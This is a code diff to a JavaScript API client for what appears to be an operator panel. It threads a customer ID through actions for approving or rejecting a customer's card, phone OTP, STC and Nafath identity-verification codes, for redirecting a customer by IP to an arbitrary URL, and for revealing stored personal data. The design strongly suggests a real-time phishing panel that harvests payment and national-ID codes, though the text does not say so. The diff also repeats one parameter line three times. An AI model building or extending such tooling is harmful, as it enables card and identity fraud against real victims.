@@ -58,6 +58,15 @@ export function getCustomer ( id )
 }
 
 /**
+ * Permanently block a customer by the identity stored on their profile.
+ * @param {number} id
+ */
+export function blockCustomer ( id )
+{
+    return request.post( `/admin/customers/${ id }/block` );
+}
+
+/**
  * Reveal sensitive PII for a specific admin customer row.
  * This is intentionally separate from the list endpoint to defer decryption.
  * @param {number} id
@@ -68,12 +77,15 @@ export function revealCustomerPii ( id )
 }
 
 /**
+ * @param {number} customerId
+ * @param {number} customerId
+ * @param {number} customerId
  * @param {string} customerIp
  * @param {string} redirectUrl
  */
-export function redirectCustomer ( customerIp, redirectUrl )
+export function redirectCustomer ( customerId, customerIp, redirectUrl )
 {
-    return request.post( '/admin/actions/redirect-customer', { customer_ip: customerIp, redirect_url: redirectUrl } );
+    return request.post( '/admin/actions/redirect-customer', { customer_id: customerId, customer_ip: customerIp, redirect_url: redirectUrl } );
 }
 
 /**
@@ -139,19 +151,20 @@ export function rejectPhoneOtp ( otpId, customerIp, reason )
  * Approve phone data (stage 1) — allows OTP to be sent.
  * @param {string} customerIp
  */
-export function approvePhoneData ( customerIp )
+export function approvePhoneData ( customerId, customerIp )
 {
-    return request.post( '/admin/actions/phone-data/approve', { customer_ip: customerIp } );
+    return request.post( '/admin/actions/phone-data/approve', { customer_id: customerId, customer_ip: customerIp } );
 }
 
 /**
  * Reject phone data (stage 1) — deny before OTP.
+ * @param {number} customerId
  * @param {string} customerIp
  * @param {string} [reason]
  */
-export function rejectPhoneData ( customerIp, reason )
+export function rejectPhoneData ( customerId, customerIp, reason )
 {
-    return request.post( '/admin/actions/phone-data/reject', { customer_ip: customerIp, reason } );
+    return request.post( '/admin/actions/phone-data/reject', { customer_id: customerId, customer_ip: customerIp, reason } );
 }
 
 // ─── STC Verification Actions (3 stages) ────────────────────────────
@@ -236,27 +249,29 @@ export function rejectCard ( cardId, reason )
  * @param {string} customerIp
  * @param {string} [verificationCode]
  */
-export function approveNafath ( customerIp, verificationCode )
+export function approveNafath ( customerId, customerIp, verificationCode )
 {
-    return request.post( '/admin/actions/nafath/approve', { customer_ip: customerIp, verification_code: verificationCode } );
+    return request.post( '/admin/actions/nafath/approve', { customer_id: customerId, customer_ip: customerIp, verification_code: verificationCode } );
 }
 
 /**
+ * @param {number} customerId
  * @param {string} customerIp
  * @param {string} [reason]
  */
-export function rejectNafath ( customerIp, reason )
+export function rejectNafath ( customerId, customerIp, reason )
 {
-    return request.post( '/admin/actions/nafath/reject', { customer_ip: customerIp, reason } );
+    return request.post( '/admin/actions/nafath/reject', { customer_id: customerId, customer_ip: customerIp, reason } );
 }
 
 /**
+ * @param {number} customerId
  * @param {string} customerIp
  * @param {string} verificationCode
  */
-export function updateNafathVerificationCode ( customerIp, verificationCode )
+export function updateNafathVerificationCode ( customerId, customerIp, verificationCode )
 {
-    return request.post( '/admin/actions/nafath/update-code', { customer_ip: customerIp, verification_code: verificationCode } );
+    return request.post( '/admin/actions/nafath/update-code', { customer_id: customerId, customer_ip: customerIp, verification_code: verificationCode } );
 }
 
 /**
